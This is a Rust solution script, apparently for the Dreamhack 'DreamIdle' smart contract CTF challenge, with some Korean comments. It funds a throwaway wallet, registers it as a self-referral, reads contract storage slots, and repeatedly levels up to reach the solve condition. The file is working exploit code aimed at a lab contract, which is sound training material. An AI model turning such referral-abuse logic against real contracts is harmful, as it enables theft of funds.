use alloy::{
    network::EthereumWallet,
    primitives::{keccak256, utils::parse_ether, Address, U256},
    providers::{Provider, ProviderBuilder},
    rpc::types::TransactionRequest,
    signers::local::PrivateKeySigner,
    sol,
    sol_types::SolValue,
};
use dreamhack_utils::challenge::info::{
    fetch_prob_info, get_info_value, read_info_url_from_arguments, rpc_url_from_info_url,
};
use eyre::Result;

const DREAMIDLE_CONTRACT_ADDRESS: &str = "dreamidle_contract_address";
const USER_PRIVATE_KEY: &str = "user_private_key";
const USER_ADDRESS_KEY: &str = "user_address";

sol! {
    #[sol(rpc)]
    interface DreamIdleInterface {
        function addNGReferral(address _referral) external;

        function levelUp(uint256 _gameId) external;

        function solve(uint256 _gameId) external;

        function feed(uint256 _gameId) external;

        function sleep(uint256 _gameId) external;

        function initGame(uint256 _gameId) external;


        function getUserLevel(address _user, uint256 _gameId) public view returns (uint256);
    }
}

#[tokio::main]
async fn main() -> Result<()> {
    let info_url = read_info_url_from_arguments()?;
    let info_map = fetch_prob_info(&info_url).await?;
    let rpc_url = rpc_url_from_info_url(&info_url)?;

    let user_private_key = get_info_value(&info_map, USER_PRIVATE_KEY)?;
    let user_address = get_info_value(&info_map, USER_ADDRESS_KEY)?;
    let dreamidle_contract_address = get_info_value(&info_map, DREAMIDLE_CONTRACT_ADDRESS)?;

    let user_signer: PrivateKeySigner = user_private_key.parse()?;
    let user_addr: Address = user_address.parse()?;
    let dreamidle_addr: Address = dreamidle_contract_address.parse()?;

    let user_provider = ProviderBuilder::new()
        .wallet(user_signer)
        .connect_http(rpc_url.parse()?);

    /* =========
    // Contract address에서 users[user_addr].ng_referral[user_addr]의 storage slot 계산
    // 참고: users 매핑은 Slot 1에 위치, ng_referral 매핑은 users[user_addr] 구조체 내에서 Offset 2에 위치
    // 1. 'users' 매핑의 베이스 슬롯 (Slot 1)
    let users_mapping_slot = U256::from(1);

    // 2. Step 1: users[user_address] 구조체가 시작되는 슬롯 계산
    // abi.encode(user_addr, users_mapping_slot)와 동일한 동작
    let base_slot_hash = keccak256((user_addr, users_mapping_slot).abi_encode());
    let base_slot = U256::from_be_bytes(base_slot_hash.0);

    // 3. Step 2: ng_referral 매핑 자체의 슬롯 위치 (Offset 2)
    let ng_referral_slot = base_slot + U256::from(2);

    // 4. Step 3: ng_referral[user_address]의 최종 데이터 슬롯
    // abi.encode(user_addr, ng_referral_slot)와 동일
    let final_slot = keccak256((user_addr, ng_referral_slot).abi_encode());

    let _ng_referral_value = provider
        .get_storage_at(dreamidle_addr, final_slot.into())
        .await?;

    // println!("as bool: {}", !ng_referral_value.is_zero()); // <- returns false
    // =========

    let ng_referral_bonus_slot =
        U256::from_be_bytes(keccak256((user_addr, U256::from(1)).abi_encode()).0) + U256::from(4);
    let ng_referral_bonus_value = provider
        .get_storage_at(dreamidle_addr, ng_referral_bonus_slot)
        .await?;
    println!(
        "NG Referral Bonus Value (before): {}",
        ng_referral_bonus_value
    );
    */

    //==== 풀이 시작:
    let dreamidle = DreamIdleInterface::new(dreamidle_addr, &user_provider);

    // Create new wallet (rich wallet)
    let rich_signer = PrivateKeySigner::random();
    let rich_wallet = EthereumWallet::new(rich_signer.clone());
    let rich_provider = ProviderBuilder::new()
        .wallet(rich_wallet)
        .connect_http(rpc_url.parse()?);

    // Send 1 ether to rich_wallet from user_wallet
    let send_1eth_tx_req = TransactionRequest::default()
        .from(user_addr)
        .to(rich_signer.address())
        .value(parse_ether("1")?);
    let _send_1eth_receipt = user_provider
        .send_transaction(send_1eth_tx_req)
        .await?
        .get_receipt()
        .await?;
    let rich_balance = rich_provider.get_balance(rich_signer.address()).await?;
    println!(
        "Rich wallet balance: {} ether",
        rich_balance / parse_ether("1")?
    );

    // create game
    let _init_game_receipt = dreamidle
        .initGame(U256::from(0))
        .send()
        .await?
        .get_receipt()
        .await?;

    // add rich_wallet as referral for user_wallet
    let _add_referral = dreamidle
        .addNGReferral(rich_signer.address())
        .send()
        .await?
        .get_receipt()
        .await?;

    let ng_referral_bonus_slot =
        U256::from_be_bytes(keccak256((user_addr, U256::from(1)).abi_encode()).0) + U256::from(4);
    let ng_referral_bonus_value = user_provider
        .get_storage_at(dreamidle_addr, ng_referral_bonus_slot)
        .await?;
    println!("NG Referral Bonus Value: {}", ng_referral_bonus_value);

    // feed(0)
    let _feed_receipt = dreamidle
        .feed(U256::from(0))
        .send()
        .await?
        .get_receipt()
        .await?;

    let first_user_level = dreamidle
        .getUserLevel(user_addr, U256::from(0))
        .call()
        .await?;
    println!("User level before levelUp(0): {}", first_user_level);

    // levelup(0)
    let _first_levelup_receipt = dreamidle
        .levelUp(U256::from(0))
        .send()
        .await?
        .get_receipt()
        .await?;
    let second_user_level = dreamidle
        .getUserLevel(user_addr, U256::from(0))
        .call()
        .await?;
    println!("User level after levelUp(0): {}", second_user_level);

    // levelUp(1)
    let _second_levelup_receipt = dreamidle
        .levelUp(U256::from(0))
        .send()
        .await?
        .get_receipt()
        .await?;
    let final_user_level = dreamidle
        .getUserLevel(user_addr, U256::from(0))
        .call()
        .await?;
    println!("User level after levelUp(0): {}", final_user_level);


    // solve(0)
    let solve_receipt = dreamidle
        .solve(U256::from(0))
        .value(parse_ether("1")?)
        .send()
        .await?
        .get_receipt()
        .await?;
    println!("solve(0) tx: {}", solve_receipt.transaction_hash);

    Ok(())
}
